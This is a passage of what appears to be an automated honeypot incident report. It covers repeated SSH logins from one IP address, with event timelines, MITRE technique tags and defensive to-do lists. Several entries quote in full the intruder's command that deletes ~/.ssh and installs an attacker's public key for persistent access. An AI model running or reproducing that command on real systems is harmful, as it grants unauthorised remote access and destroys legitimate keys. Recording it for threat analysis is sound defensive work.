| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:47:08` | `cowrie.session.connect` |
| `2026-05-01 05:47:08` | `cowrie.client.version` |
| `2026-05-01 05:47:08` | `cowrie.client.kex` |
| `2026-05-01 05:47:09` | `cowrie.login.success` |
| `2026-05-01 05:47:10` | `cowrie.session.params` |
| `2026-05-01 05:47:10` | `cowrie.command.input` |
| `2026-05-01 05:47:10` | `cowrie.command.failed` |
| `2026-05-01 05:47:11` | `cowrie.log.closed` |
| `2026-05-01 05:47:11` | `cowrie.session.params` |
| `2026-05-01 05:47:11` | `cowrie.command.input` |
| `2026-05-01 05:47:12` | `cowrie.session.file_download` |
| `2026-05-01 05:47:12` | `cowrie.log.closed` |
| `2026-05-01 05:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad9df280827

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:47 |
| **Last Seen** | 2026-05-01 05:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:47:15` | `cowrie.session.connect` |
| `2026-05-01 05:47:15` | `cowrie.client.version` |
| `2026-05-01 05:47:16` | `cowrie.client.kex` |
| `2026-05-01 05:47:17` | `cowrie.login.success` |
| `2026-05-01 05:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e67179aede2

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:48 |
| **Last Seen** | 2026-05-01 05:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:48:09` | `cowrie.session.connect` |
| `2026-05-01 05:48:09` | `cowrie.client.version` |
| `2026-05-01 05:48:09` | `cowrie.client.kex` |
| `2026-05-01 05:48:11` | `cowrie.login.success` |
| `2026-05-01 05:48:11` | `cowrie.session.params` |
| `2026-05-01 05:48:11` | `cowrie.command.input` |
| `2026-05-01 05:48:11` | `cowrie.command.failed` |
| `2026-05-01 05:48:12` | `cowrie.log.closed` |
| `2026-05-01 05:48:13` | `cowrie.session.params` |
| `2026-05-01 05:48:13` | `cowrie.command.input` |
| `2026-05-01 05:48:13` | `cowrie.session.file_download` |
| `2026-05-01 05:48:13` | `cowrie.log.closed` |
| `2026-05-01 05:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-334cb9fa9853

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:48 |
| **Last Seen** | 2026-05-01 05:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:48:17` | `cowrie.session.connect` |
| `2026-05-01 05:48:17` | `cowrie.client.version` |
| `2026-05-01 05:48:17` | `cowrie.client.kex` |
| `2026-05-01 05:48:18` | `cowrie.login.success` |
| `2026-05-01 05:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d25fa95d283

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:49 |
| **Last Seen** | 2026-05-01 05:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:49:13` | `cowrie.session.connect` |
| `2026-05-01 05:49:13` | `cowrie.client.version` |
| `2026-05-01 05:49:13` | `cowrie.client.kex` |
| `2026-05-01 05:49:14` | `cowrie.login.success` |
| `2026-05-01 05:49:15` | `cowrie.session.params` |
| `2026-05-01 05:49:15` | `cowrie.command.input` |
| `2026-05-01 05:49:15` | `cowrie.command.failed` |
| `2026-05-01 05:49:15` | `cowrie.log.closed` |
| `2026-05-01 05:49:16` | `cowrie.session.params` |
| `2026-05-01 05:49:16` | `cowrie.command.input` |
| `2026-05-01 05:49:17` | `cowrie.session.file_download` |
| `2026-05-01 05:49:17` | `cowrie.log.closed` |
| `2026-05-01 05:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a6298ce35c1

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:49 |
| **Last Seen** | 2026-05-01 05:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:49:20` | `cowrie.session.connect` |
| `2026-05-01 05:49:20` | `cowrie.client.version` |
| `2026-05-01 05:49:21` | `cowrie.client.kex` |
| `2026-05-01 05:49:22` | `cowrie.login.success` |
| `2026-05-01 05:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6c526ff8d2d

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:50 |
| **Last Seen** | 2026-05-01 05:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:50:16` | `cowrie.session.connect` |
| `2026-05-01 05:50:16` | `cowrie.client.version` |
| `2026-05-01 05:50:16` | `cowrie.client.kex` |
| `2026-05-01 05:50:17` | `cowrie.login.success` |
| `2026-05-01 05:50:18` | `cowrie.session.params` |
| `2026-05-01 05:50:18` | `cowrie.command.input` |
| `2026-05-01 05:50:18` | `cowrie.command.failed` |
| `2026-05-01 05:50:19` | `cowrie.log.closed` |
| `2026-05-01 05:50:19` | `cowrie.session.params` |
| `2026-05-01 05:50:19` | `cowrie.command.input` |
| `2026-05-01 05:50:20` | `cowrie.session.file_download` |
| `2026-05-01 05:50:20` | `cowrie.log.closed` |
| `2026-05-01 05:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-613ad2897625

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:50 |
| **Last Seen** | 2026-05-01 05:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:50:24` | `cowrie.session.connect` |
| `2026-05-01 05:50:24` | `cowrie.client.version` |
| `2026-05-01 05:50:24` | `cowrie.client.kex` |
| `2026-05-01 05:50:25` | `cowrie.login.success` |
| `2026-05-01 05:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c8a005d013

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:51 |
| **Last Seen** | 2026-05-01 05:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:51:20` | `cowrie.session.connect` |
| `2026-05-01 05:51:20` | `cowrie.client.version` |
| `2026-05-01 05:51:20` | `cowrie.client.kex` |
| `2026-05-01 05:51:21` | `cowrie.login.success` |
| `2026-05-01 05:51:22` | `cowrie.session.params` |
| `2026-05-01 05:51:22` | `cowrie.command.input` |
| `2026-05-01 05:51:22` | `cowrie.command.failed` |
| `2026-05-01 05:51:23` | `cowrie.log.closed` |
| `2026-05-01 05:51:23` | `cowrie.session.params` |
| `2026-05-01 05:51:23` | `cowrie.command.input` |
| `2026-05-01 05:51:24` | `cowrie.session.file_download` |
| `2026-05-01 05:51:24` | `cowrie.log.closed` |
| `2026-05-01 05:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd327a689656

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:51 |
| **Last Seen** | 2026-05-01 05:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:51:27` | `cowrie.session.connect` |
| `2026-05-01 05:51:27` | `cowrie.client.version` |
| `2026-05-01 05:51:28` | `cowrie.client.kex` |
| `2026-05-01 05:51:29` | `cowrie.login.success` |
| `2026-05-01 05:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59fb9f4bc330

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:52 |
| **Last Seen** | 2026-05-01 05:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:52:21` | `cowrie.session.connect` |
| `2026-05-01 05:52:21` | `cowrie.client.version` |
| `2026-05-01 05:52:22` | `cowrie.client.kex` |
| `2026-05-01 05:52:23` | `cowrie.login.success` |
| `2026-05-01 05:52:24` | `cowrie.session.params` |
| `2026-05-01 05:52:24` | `cowrie.command.input` |
| `2026-05-01 05:52:24` | `cowrie.command.failed` |
| `2026-05-01 05:52:24` | `cowrie.log.closed` |
| `2026-05-01 05:52:25` | `cowrie.session.params` |
| `2026-05-01 05:52:25` | `cowrie.command.input` |
| `2026-05-01 05:52:25` | `cowrie.session.file_download` |
| `2026-05-01 05:52:25` | `cowrie.log.closed` |
| `2026-05-01 05:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47a7915c9dfb

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:52 |
| **Last Seen** | 2026-05-01 05:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:52:29` | `cowrie.session.connect` |
| `2026-05-01 05:52:29` | `cowrie.client.version` |
| `2026-05-01 05:52:29` | `cowrie.client.kex` |
| `2026-05-01 05:52:31` | `cowrie.login.success` |
| `2026-05-01 05:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c9bd06e5364

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:53 |
| **Last Seen** | 2026-05-01 05:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:53:24` | `cowrie.session.connect` |
| `2026-05-01 05:53:24` | `cowrie.client.version` |
| `2026-05-01 05:53:25` | `cowrie.client.kex` |
| `2026-05-01 05:53:26` | `cowrie.login.success` |
| `2026-05-01 05:53:27` | `cowrie.session.params` |
| `2026-05-01 05:53:27` | `cowrie.command.input` |
| `2026-05-01 05:53:27` | `cowrie.command.failed` |
| `2026-05-01 05:53:27` | `cowrie.log.closed` |
| `2026-05-01 05:53:28` | `cowrie.session.params` |
| `2026-05-01 05:53:28` | `cowrie.command.input` |
| `2026-05-01 05:53:28` | `cowrie.session.file_download` |
| `2026-05-01 05:53:28` | `cowrie.log.closed` |
| `2026-05-01 05:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0343f895bda7

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:53 |
| **Last Seen** | 2026-05-01 05:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:53:32` | `cowrie.session.connect` |
| `2026-05-01 05:53:32` | `cowrie.client.version` |
| `2026-05-01 05:53:32` | `cowrie.client.kex` |
| `2026-05-01 05:53:34` | `cowrie.login.success` |
| `2026-05-01 05:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a351137e686

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:54 |
| **Last Seen** | 2026-05-01 05:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:54:27` | `cowrie.session.connect` |
| `2026-05-01 05:54:27` | `cowrie.client.version` |
| `2026-05-01 05:54:28` | `cowrie.client.kex` |
| `2026-05-01 05:54:29` | `cowrie.login.success` |
| `2026-05-01 05:54:30` | `cowrie.session.params` |
| `2026-05-01 05:54:30` | `cowrie.command.input` |
| `2026-05-01 05:54:30` | `cowrie.command.failed` |
| `2026-05-01 05:54:30` | `cowrie.log.closed` |
| `2026-05-01 05:54:31` | `cowrie.session.params` |
| `2026-05-01 05:54:31` | `cowrie.command.input` |
| `2026-05-01 05:54:32` | `cowrie.session.file_download` |
| `2026-05-01 05:54:32` | `cowrie.log.closed` |
| `2026-05-01 05:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-479fdb3643d5

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:54 |
| **Last Seen** | 2026-05-01 05:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:54:35` | `cowrie.session.connect` |
| `2026-05-01 05:54:35` | `cowrie.client.version` |
| `2026-05-01 05:54:36` | `cowrie.client.kex` |
| `2026-05-01 05:54:37` | `cowrie.login.success` |
| `2026-05-01 05:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d01389a91961

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:55 |
| **Last Seen** | 2026-05-01 05:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:55:34` | `cowrie.session.connect` |
| `2026-05-01 05:55:34` | `cowrie.client.version` |
| `2026-05-01 05:55:34` | `cowrie.client.kex` |
| `2026-05-01 05:55:35` | `cowrie.login.success` |
| `2026-05-01 05:55:36` | `cowrie.session.params` |
| `2026-05-01 05:55:36` | `cowrie.command.input` |
